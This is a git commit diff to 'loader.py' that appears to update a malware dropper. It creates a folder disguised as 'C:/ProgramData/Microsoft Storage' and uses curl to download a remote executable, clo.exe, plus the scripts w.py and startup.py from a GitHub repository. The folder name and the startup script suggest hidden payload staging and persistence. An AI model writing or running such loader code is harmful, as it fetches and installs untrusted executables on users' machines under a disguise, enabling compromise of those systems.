63921cf9ce82907605f480e5621d4c9b90c0ff33
Fghth <150439444+Fghthssss@users.noreply.github.com>
2025-11-15 22:00:55 +0300

    Update loader.py

--- loader.py
+++ loader.py
@@ -1,4 +1,8 @@
 import os
 
-os.system("curl -O https://github.com/Fghthssss/BUSB/raw/refs/heads/main/clo.exe")
+os.system("mkdir C:/ProgramData/Microsoft Storage")
+os.system("cd C:/ProgramData/Microsoft Storage")
+
+os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/clo.exe")
 os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/w.py")
+os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/startup.py")
